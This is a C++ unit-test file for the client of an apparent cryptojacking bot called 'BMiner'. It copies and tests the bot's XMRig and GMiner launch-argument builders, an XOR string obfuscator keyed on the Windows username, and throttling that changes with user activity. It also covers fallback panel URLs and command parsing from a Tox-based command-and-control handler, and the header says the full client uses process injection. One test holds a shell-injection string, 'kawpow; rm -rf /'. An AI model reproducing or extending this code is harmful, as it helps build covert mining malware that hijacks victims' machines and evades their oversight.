// Standalone unit tests for BMiner client pure-logic functions.
// No Windows headers, no WinHTTP, no process injection.
//
// Compile (MinGW, from the Client directory):
//   g++ -std=c++17 -I include -I src -o test/test_client_logic.exe test/test_client_logic.cpp && test/test_client_logic.exe
//
// Exit 0 = all pass, non-zero = failure count.

#include <cassert>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>

// ---------------------------------------------------------------------------
// Pull in the header-only encryption helpers directly.
// ---------------------------------------------------------------------------
#include "../include/encryption.h"

// ---------------------------------------------------------------------------
// Inline copies of the anon-namespace validators from config_manager.cpp.
// We copy (not #include the .cpp) to keep the test free of WinHTTP deps.
// If the validators change in config_manager.cpp, update these copies too.
// ---------------------------------------------------------------------------

static bool IsSafeArgToken(const std::string& s, size_t maxLen = 256)
{
    if (s.empty() || s.size() > maxLen) return false;
    for (char c : s) {
        if (c == '"' || c == '\'' || c == ' ' || c == '\t' ||
            c == '\r' || c == '\n' || c == '\0')
            return false;
        const unsigned char uc = static_cast<unsigned char>(c);
        if (uc < 0x20 || uc > 0x7E) return false;
    }
    if (s.size() >= 1 && s[0] == '-') return false;
    return true;
}

static bool IsSafeMiningUrl(const std::string& s)
{
    if (s.empty() || s.size() > 256) return false;
    std::string host = s;
    const size_t schemeEnd = host.find("://");
    if (schemeEnd != std::string::npos) {
        const std::string scheme = host.substr(0, schemeEnd);
        for (char c : scheme) {
            const unsigned char uc = static_cast<unsigned char>(c);
            if (!(uc == '+' || (uc >= 'a' && uc <= 'z') || (uc >= '0' && uc <= '9')))
                return false;
        }
        host = host.substr(schemeEnd + 3);
    }
    const size_t colon = host.rfind(':');
    if (colon == std::string::npos) return false;
    const std::string hostname = host.substr(0, colon);
    const std::string portStr  = host.substr(colon + 1);
    if (hostname.empty() || portStr.empty() || portStr.size() > 5) return false;
    for (char c : hostname) {
        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
              (c >= '0' && c <= '9') || c == '.' || c == '-'))
            return false;
    }
    int port = 0;
    for (char c : portStr) {
        if (c < '0' || c > '9') return false;
        port = port * 10 + (c - '0');
        if (port > 65535) return false;
    }
    return port >= 1 && port <= 65535;
}

static bool IsSafeAlgo(const std::string& s)
{
    static const char* const kAllowed[] = {
        "kawpow", "etchash", "ethash", "octopus",
        "equihash144_5", "equihash144_5_btg", "equihash144_5_zen",
        "equihash125_4", "equihash125_4_zec",
    };
    for (const char* a : kAllowed) if (s == a) return true;
    return false;
}

// ---------------------------------------------------------------------------
// Minimal MinerConfig mirror (matches config_manager.h)
// ---------------------------------------------------------------------------

struct MinerConfig {
    std::string mining_url;
    std::string wallet;
    std::string password;
    std::string algo;
    double non_idle_usage = 50.0;
    double idle_usage     = 100.0;
    int wait_time_idle    = 3;
    int use_ssl           = 0;
    int enabled           = 1;
    int fan_speed         = 0;
};

// ---------------------------------------------------------------------------
// Inline copy of BuildCommandLineArgs (from config_manager.cpp).
// GetWindowsUsername() is shimmed to a fixed string for tests.
// ---------------------------------------------------------------------------

static std::string FakeUsername() { return "testuser"; }

static std::string BuildCommandLineArgs(const MinerConfig& config, bool isIdle = false)
{
    if (config.mining_url.empty() || config.wallet.empty()) return "";

    std::string args = "--donate-level 3 -o ";
    args += config.mining_url + " ";
    args += "-u ";
    args += config.wallet + " ";

    std::string password = config.password;
    if (password == "{USER}") password = FakeUsername();

    if (!password.empty()) {
        args += "-p ";
        args += password + " ";
    }

    if (config.use_ssl == 1 || config.password.find("--tls") != std::string::npos) {
        args += "--tls ";
    }

    double usagePercent = isIdle ? config.idle_usage : config.non_idle_usage;
    if (usagePercent >= 0) {
        int hint = static_cast<int>(usagePercent);
        args += "--cpu-max-threads-hint=";
        args += std::to_string(hint) + " ";
    }

    args += "-a rx/0";
    return args;
}

// ---------------------------------------------------------------------------
// Inline copy of buildGminerArgs from main.cpp.
// ---------------------------------------------------------------------------

static std::string getAlgoMapping(const std::string& algo) {
    if (algo == "equihash144_5_btg") return "equihash144_5";
    if (algo == "equihash144_5_zen") return "equihash144_5";
    if (algo == "equihash125_4_zec") return "equihash125_4";
    return algo;
}

static std::string getPersString(const std::string& algo) {
    if (algo == "equihash144_5_btg") return "BgoldPoW";
    if (algo == "equihash144_5_zen") return "ZcashPoW";
    if (algo == "equihash125_4_zec") return "ZcashPoW";
    return "";
}

static std::string buildGminerArgs(const MinerConfig& c, bool isAdmin = false)
{
    const std::string GMINER_ALGO    = "--algo ";
    const std::string GMINER_SERVER  = " --server ";
    const std::string GMINER_USER    = " --user ";
    const std::string GMINER_WORKER  = " --worker ";
    const std::string GMINER_SSL_OFF = " --ssl 0";
    const std::string GMINER_SSL_ON  = " --ssl 1";
    const std::string GMINER_PERS    = " --pers ";
    const std::string GMINER_FAN     = " --fan ";
    const std::string GMINER_API     = " --api 21550 --watchdog 0 --color 0";

    std::string args = GMINER_ALGO + getAlgoMapping(c.algo);
    { const std::string p = getPersString(c.algo); if (!p.empty()) args += GMINER_PERS + p; }
    args += GMINER_SERVER + c.mining_url;
    args += GMINER_USER   + c.wallet + "." + c.password;
    args += GMINER_WORKER + c.password;
    args += (c.use_ssl == 1 ? GMINER_SSL_ON : GMINER_SSL_OFF);
    if (c.fan_speed > 0 && isAdmin) {
        args += GMINER_FAN + std::to_string(c.fan_speed);
    }
    args += GMINER_API;
    return args;
}

// ---------------------------------------------------------------------------
// Config-change detection (mirrors applyConfigUpdate booleans from main.cpp)
// ---------------------------------------------------------------------------

static bool cpuConfigChanged(const MinerConfig& a, const MinerConfig& b)
{
    return a.mining_url     != b.mining_url     ||
           a.wallet         != b.wallet         ||
           a.password       != b.password       ||
           a.non_idle_usage != b.non_idle_usage ||
           a.idle_usage     != b.idle_usage     ||
           a.use_ssl        != b.use_ssl        ||
           a.wait_time_idle != b.wait_time_idle ||
           a.enabled        != b.enabled;
}

static bool gpuConfigChanged(const MinerConfig& a, const MinerConfig& b)
{
    return a.mining_url     != b.mining_url     ||
           a.wallet         != b.wallet         ||
           a.password       != b.password       ||
           a.algo           != b.algo           ||
           a.non_idle_usage != b.non_idle_usage ||
           a.idle_usage     != b.idle_usage     ||
           a.fan_speed      != b.fan_speed      ||
           a.use_ssl        != b.use_ssl        ||
           a.wait_time_idle != b.wait_time_idle ||
           a.enabled        != b.enabled;
}

// ---------------------------------------------------------------------------
// URL splitting (mirrors FetchConfigFromPanelWithFallback logic)
// ---------------------------------------------------------------------------

static std::vector<std::string> splitUrls(const std::string& s)
{
    std::vector<std::string> out;
    std::string tok;
    for (char c : s + ',') {
        if (c == ',') {
            size_t a = tok.find_first_not_of(" \t\r\n");
            size_t b = tok.find_last_not_of(" \t\r\n");
            if (a != std::string::npos) out.push_back(tok.substr(a, b - a + 1));
            tok.clear();
        } else {
            tok += c;
        }
    }
    return out;
}

// ---------------------------------------------------------------------------
// Test framework
// ---------------------------------------------------------------------------

static int g_failures = 0;
static int g_total    = 0;

#define CHECK(cond, msg) \
    do { \
        ++g_total; \
        if (!(cond)) { printf("  FAIL [%s:%d]: %s\n", __FILE__, __LINE__, msg); ++g_failures; } \
        else         { printf("  PASS: %s\n", msg); } \
    } while (0)

// ---------------------------------------------------------------------------
// Test suites
// ---------------------------------------------------------------------------

static void test_xor_encrypt_decrypt()
{
    printf("\n=== XOR encrypt / decrypt ===\n");

    const std::string key  = "testuser";
    const std::string data = "--donate-level 3 -o pool.example.com:3333 -u wallet123";

    const std::string enc = XorEncryptToHex(data, key);
    CHECK(!enc.empty(),               "encrypted is non-empty");
    CHECK(enc.size() == data.size()*2,"hex output is exactly 2x input length");
    CHECK(enc != data,                "cipher differs from plaintext");

    const std::string dec = HexXorDecrypt(enc, key);
    CHECK(dec == data,                "round-trip decrypt matches original");

    // Empty-key guard
    CHECK(XorEncryptToHex(data, "").empty(),  "empty key → empty ciphertext");
    CHECK(HexXorDecrypt("aabb", "").empty(),  "empty key → empty decrypt");

    // Odd-length hex guard
    CHECK(HexXorDecrypt("abc", key).empty(),  "odd-length hex → empty decrypt");

    // Different keys produce different output
    const std::string enc2 = XorEncryptToHex(data, "otheruser");
    CHECK(enc != enc2,                "different keys produce different ciphertext");

    // Long key (longer than data) should still round-trip
    const std::string longKey = "averylongusernamethatexceedsthedatasize";
    const std::string encLong = XorEncryptToHex("hi", longKey);
    CHECK(HexXorDecrypt(encLong, longKey) == "hi", "long key round-trip");
}

static void test_is_safe_mining_url()
{
    printf("\n=== IsSafeMiningUrl ===\n");

    // Valid
    CHECK(IsSafeMiningUrl("pool.example.com:3333"),           "plain host:port");
    CHECK(IsSafeMiningUrl("stratum+tcp://pool.example.com:3333"), "stratum+tcp scheme");
    CHECK(IsSafeMiningUrl("stratum+ssl://pool.example.com:443"),  "stratum+ssl scheme");
    CHECK(IsSafeMiningUrl("192.168.1.1:1234"),                "IPv4 address");
    CHECK(IsSafeMiningUrl("mine-pool.org:65535"),             "max valid port");
    CHECK(IsSafeMiningUrl("a:1"),                             "single-char host, min port");
    CHECK(IsSafeMiningUrl("pool.example.com:3333"),       "typical pool");

    // Invalid
    CHECK(!IsSafeMiningUrl(""),                               "empty string");
    CHECK(!IsSafeMiningUrl("pool.example.com"),               "no port");
    CHECK(!IsSafeMiningUrl("pool.example.com:0"),             "port 0 invalid");
    CHECK(!IsSafeMiningUrl("pool.example.com:65536"),         "port too high");
    CHECK(!IsSafeMiningUrl("pool example.com:3333"),          "space in hostname");
    CHECK(!IsSafeMiningUrl("pool.example.com:port"),          "non-numeric port");
    CHECK(!IsSafeMiningUrl("pool.example.com:33 33"),         "space in port");
    CHECK(!IsSafeMiningUrl("pool.example.com:-1"),            "negative port string");
    CHECK(!IsSafeMiningUrl(std::string(257, 'a') + ":3333"),  "URL too long");
    // Injection attempt: extra flags after port
    CHECK(!IsSafeMiningUrl("pool.example.com:3333 --api-server 0.0.0.0"), "space injection in url");
}

static void test_is_safe_arg_token()
{
    printf("\n=== IsSafeArgToken ===\n");

    // Valid wallet / password tokens (synthetic wallet-shaped value — never a real address)
    CHECK(IsSafeArgToken("4KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK"), "wallet-shaped token");
    CHECK(IsSafeArgToken("rig1"),                        "simple worker name");
    CHECK(IsSafeArgToken("x"),                           "single char");
    CHECK(IsSafeArgToken("worker.01"),                   "dot in token");

    // Invalid
    CHECK(!IsSafeArgToken(""),                           "empty string");
    CHECK(!IsSafeArgToken("wallet name"),                "space");
    CHECK(!IsSafeArgToken("-wallet"),                    "leading dash (flag injection)");
    CHECK(!IsSafeArgToken("--flag"),                     "double dash (flag injection)");
    CHECK(!IsSafeArgToken("wallet\ttab"),                "tab character");
    CHECK(!IsSafeArgToken("wallet\nnewline"),             "newline character");
    CHECK(!IsSafeArgToken("wal\"let"),                   "double quote");
    CHECK(!IsSafeArgToken("wal'let"),                    "single quote");
    CHECK(!IsSafeArgToken(std::string(129, 'a'), 128),   "exceeds maxLen=128");
    // Control character
    std::string ctrl = "wallet"; ctrl += '\x01';
    CHECK(!IsSafeArgToken(ctrl),                         "control char in token");
}

static void test_is_safe_algo()
{
    printf("\n=== IsSafeAlgo ===\n");

    CHECK(IsSafeAlgo("kawpow"),              "kawpow");
    CHECK(IsSafeAlgo("etchash"),             "etchash");
    CHECK(IsSafeAlgo("ethash"),              "ethash");
    CHECK(IsSafeAlgo("octopus"),             "octopus");
    CHECK(IsSafeAlgo("equihash144_5"),       "equihash144_5");
    CHECK(IsSafeAlgo("equihash144_5_btg"),   "equihash144_5_btg");
    CHECK(IsSafeAlgo("equihash144_5_zen"),   "equihash144_5_zen");
    CHECK(IsSafeAlgo("equihash125_4"),       "equihash125_4");
    CHECK(IsSafeAlgo("equihash125_4_zec"),   "equihash125_4_zec");

    CHECK(!IsSafeAlgo(""),                              "empty string");
    CHECK(!IsSafeAlgo("rx/0"),                          "XMRig algo (not for GMiner)");
    CHECK(!IsSafeAlgo("kawpow; rm -rf /"),              "shell injection attempt");
    CHECK(!IsSafeAlgo("KAWPOW"),                        "wrong case");
    CHECK(!IsSafeAlgo("unknown"),                       "unknown algo");
}

static void test_build_command_line_args()
{
    printf("\n=== BuildCommandLineArgs (XMRig) ===\n");

    MinerConfig c;
    c.mining_url     = "pool.example.com:3333";
    c.wallet         = "wallet123";
    c.password       = "rig1";
    c.non_idle_usage = 50.0;
    c.idle_usage     = 100.0;
    c.use_ssl        = 0;

    const std::string args = BuildCommandLineArgs(c, false /*not idle*/);
    CHECK(args.find("--donate-level 3") != std::string::npos,  "has donate-level");
    CHECK(args.find("-o pool.example.com:3333") != std::string::npos, "has pool URL");
    CHECK(args.find("-u wallet123") != std::string::npos,       "has wallet");
    CHECK(args.find("-p rig1") != std::string::npos,            "has password");
    CHECK(args.find("--cpu-max-threads-hint=50") != std::string::npos, "non-idle hint=50");
    CHECK(args.find("--tls") == std::string::npos,              "no TLS when use_ssl=0");
    CHECK(args.find("-a rx/0") != std::string::npos,            "has algo");

    // Idle path
    const std::string argsIdle = BuildCommandLineArgs(c, true);
    CHECK(argsIdle.find("--cpu-max-threads-hint=100") != std::string::npos, "idle hint=100");

    // TLS via use_ssl
    MinerConfig cTls = c;
    cTls.use_ssl = 1;
    CHECK(BuildCommandLineArgs(cTls).find("--tls") != std::string::npos, "TLS added when use_ssl=1");

    // {USER} password expansion
    MinerConfig cUser = c;
    cUser.password = "{USER}";
    const std::string argsUser = BuildCommandLineArgs(cUser);
    CHECK(argsUser.find("-p testuser") != std::string::npos, "{USER} expands to username");

    // Empty URL / wallet returns empty string
    MinerConfig empty;
    CHECK(BuildCommandLineArgs(empty).empty(), "empty config → empty args");

    MinerConfig noWallet = c; noWallet.wallet = "";
    CHECK(BuildCommandLineArgs(noWallet).empty(), "missing wallet → empty args");

    MinerConfig noUrl = c; noUrl.mining_url = "";
    CHECK(BuildCommandLineArgs(noUrl).empty(), "missing url → empty args");
}

static void test_build_gminer_args()
{
    printf("\n=== buildGminerArgs (GMiner) ===\n");

    MinerConfig c;
    c.mining_url = "eu.kawpow.pool:3333";
    c.wallet     = "walletABC";
    c.password   = "worker1";
    c.algo       = "kawpow";
    c.use_ssl    = 0;
    c.fan_speed  = 0;

    const std::string args = buildGminerArgs(c, false);
    CHECK(args.find("--algo kawpow") != std::string::npos,     "algo kawpow");
    CHECK(args.find("--server eu.kawpow.pool:3333") != std::string::npos, "server");
    CHECK(args.find("--user walletABC.worker1") != std::string::npos,     "user=wallet.worker");
    CHECK(args.find("--worker worker1") != std::string::npos,              "worker");
    CHECK(args.find("--ssl 0") != std::string::npos,           "ssl off");
    CHECK(args.find("--api 21550") != std::string::npos,       "api port");
    CHECK(args.find("--fan") == std::string::npos,             "no fan when fan_speed=0");

    // SSL on
    MinerConfig cSsl = c; cSsl.use_ssl = 1;
    CHECK(buildGminerArgs(cSsl).find("--ssl 1") != std::string::npos, "ssl on");

    // Fan speed (requires admin)
    MinerConfig cFan = c; cFan.fan_speed = 70;
    CHECK(buildGminerArgs(cFan, true).find("--fan 70") != std::string::npos, "fan speed with admin");
    CHECK(buildGminerArgs(cFan, false).find("--fan") == std::string::npos,   "fan speed without admin skipped");

    // Equihash BTG: algo remapped, pers appended
    MinerConfig cBtg = c; cBtg.algo = "equihash144_5_btg";
    const std::string argsBtg = buildGminerArgs(cBtg);
    CHECK(argsBtg.find("--algo equihash144_5") != std::string::npos, "BTG algo remapped");
    CHECK(argsBtg.find("--pers BgoldPoW") != std::string::npos,      "BTG pers string");

    // Equihash ZEC
    MinerConfig cZec = c; cZec.algo = "equihash125_4_zec";
    const std::string argsZec = buildGminerArgs(cZec);
    CHECK(argsZec.find("--algo equihash125_4") != std::string::npos, "ZEC algo remapped");
    CHECK(argsZec.find("--pers ZcashPoW") != std::string::npos,      "ZEC pers string");

    // Ethash: no pers
    MinerConfig cEth = c; cEth.algo = "ethash";
    CHECK(buildGminerArgs(cEth).find("--pers") == std::string::npos, "ethash has no pers");
}

static void test_config_change_detection()
{
    printf("\n=== Config change detection (applyConfigUpdate logic) ===\n");

    MinerConfig base;
    base.mining_url     = "pool.example.com:3333";
    base.wallet         = "wallet123";
    base.password       = "rig1";
    base.algo           = "kawpow";
    base.non_idle_usage = 50.0;
    base.idle_usage     = 100.0;
    base.use_ssl        = 0;
    base.wait_time_idle = 3;
    base.enabled        = 1;
    base.fan_speed      = 0;

    // Identity: no change
    CHECK(!cpuConfigChanged(base, base), "identical config → no cpu change");
    CHECK(!gpuConfigChanged(base, base), "identical config → no gpu change");

    // CPU-tracked fields
    { MinerConfig b = base; b.mining_url = "other.pool:4444";
      CHECK(cpuConfigChanged(base, b), "cpu: url change detected"); }
    { MinerConfig b = base; b.wallet = "otherwallet";
      CHECK(cpuConfigChanged(base, b), "cpu: wallet change detected"); }
    { MinerConfig b = base; b.password = "rig2";
      CHECK(cpuConfigChanged(base, b), "cpu: password change detected"); }
    { MinerConfig b = base; b.non_idle_usage = 75.0;
      CHECK(cpuConfigChanged(base, b), "cpu: non_idle_usage change detected"); }
    { MinerConfig b = base; b.idle_usage = 80.0;
      CHECK(cpuConfigChanged(base, b), "cpu: idle_usage change detected"); }
    { MinerConfig b = base; b.use_ssl = 1;
      CHECK(cpuConfigChanged(base, b), "cpu: use_ssl change detected"); }
    { MinerConfig b = base; b.wait_time_idle = 10;
      CHECK(cpuConfigChanged(base, b), "cpu: wait_time_idle change detected"); }
    { MinerConfig b = base; b.enabled = 0;
      CHECK(cpuConfigChanged(base, b), "cpu: enabled change detected"); }

    // algo is NOT a CPU-tracked field — changing it alone should NOT trigger cpu restart
    { MinerConfig b = base; b.algo = "ethash";
      CHECK(!cpuConfigChanged(base, b), "cpu: algo-only change does NOT trigger restart"); }

    // GPU-tracked fields (includes algo + fan_speed)
    { MinerConfig b = base; b.algo = "ethash";
      CHECK(gpuConfigChanged(base, b), "gpu: algo change detected"); }
    { MinerConfig b = base; b.fan_speed = 60;
      CHECK(gpuConfigChanged(base, b), "gpu: fan_speed change detected"); }
    // wallet change triggers gpu restart too
    { MinerConfig b = base; b.wallet = "otherwallet";
      CHECK(gpuConfigChanged(base, b), "gpu: wallet change detected"); }

    // fan_speed does NOT affect CPU restart
    { MinerConfig b = base; b.fan_speed = 80;
      CHECK(!cpuConfigChanged(base, b), "cpu: fan_speed-only change does NOT trigger cpu restart"); }
}

static void test_url_splitting()
{
    printf("\n=== Panel URL splitting ===\n");

    auto urls = splitUrls("http://panel1.com/api, http://panel2.com/api");
    CHECK(urls.size() == 2, "two URLs parsed");
    CHECK(urls[0] == "http://panel1.com/api", "first URL trimmed");
    CHECK(urls[1] == "http://panel2.com/api", "second URL trimmed");

    auto single = splitUrls("http://panel.com/api");
    CHECK(single.size() == 1, "single URL");

    // Extra whitespace / blank entries are skipped
    auto sloppy = splitUrls("  http://a.com  ,  , http://b.com  ");
    CHECK(sloppy.size() == 2, "blank entry skipped, 2 URLs");

    // Trailing comma
    auto trailing = splitUrls("http://a.com,");
    CHECK(trailing.size() == 1, "trailing comma: 1 URL");

    auto empty = splitUrls("");
    CHECK(empty.empty(), "empty string → no URLs");
}

static void test_tox_command_parsing()
{
    printf("\n=== Tox command parsing (dry mock) ===\n");

    // Replicate the command-parsing logic from the Tox C2 handler (main.cpp).
    auto parseCmd = [](const std::string& line) -> std::string {
        const size_t sp = line.find_first_of(" \t");
        std::string cmd = line.substr(0, sp);
        for (char& c : cmd) if (c >= 'A' && c <= 'Z') c = static_cast<char>(c + 32);
        return cmd;
    };

    auto extractPayload = [](const std::string& line) -> std::string {
        const size_t sp = line.find_first_of(" \t");
        if (sp == std::string::npos) return "";
        std::string p = line.substr(sp + 1);
        size_t a = p.find_first_not_of(" \t\r\n");
        size_t b = p.find_last_not_of(" \t\r\n");
        return (a == std::string::npos) ? "" : p.substr(a, b - a + 1);
    };

    CHECK(parseCmd("ping") == "ping",       "ping lowercased");
    CHECK(parseCmd("PING") == "ping",       "PING → ping");
    CHECK(parseCmd("Status") == "status",   "Status → status");
    CHECK(parseCmd("STOP") == "stop",       "STOP → stop");
    CHECK(parseCmd("RESTART") == "restart", "RESTART → restart");
    CHECK(parseCmd("config {...}") == "config", "config command extracted");

    CHECK(extractPayload("config {\"a\":1}") == "{\"a\":1}", "payload extracted");
    CHECK(extractPayload("config   {\"a\":1}  ") == "{\"a\":1}", "payload trimmed");
    CHECK(extractPayload("ping").empty(), "no payload for ping");

    // Simulated config size guard
    const std::string bigJson(512 * 1024 + 1, 'x');
    CHECK(bigJson.size() > 512 * 1024, "oversized config detected");

    // Valid JSON check (using basic heuristics without pulling in json.hpp)
    auto looksLikeJson = [](const std::string& s) -> bool {
        if (s.empty()) return false;
        size_t a = s.find_first_not_of(" \t\r\n");
        return a != std::string::npos && s[a] == '{';
    };
    CHECK(looksLikeJson("{\"key\":\"val\"}"), "valid JSON-looking string");
    CHECK(!looksLikeJson(""),                 "empty is not JSON");
    CHECK(!looksLikeJson("not json"),         "plain text is not JSON");
    CHECK(!looksLikeJson("config rejected: invalid json"), "error string is not JSON");
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------

int main()
{
    printf("=== BMiner client logic unit tests ===\n");

    test_xor_encrypt_decrypt();
    test_is_safe_mining_url();
    test_is_safe_arg_token();
    test_is_safe_algo();
    test_build_command_line_args();
    test_build_gminer_args();
    test_config_change_detection();
    test_url_splitting();
    test_tox_command_parsing();

    printf("\n=== Results: %d / %d passed, %d failure(s) ===\n",
           g_total - g_failures, g_total, g_failures);
    return g_failures == 0 ? 0 : g_failures;
}
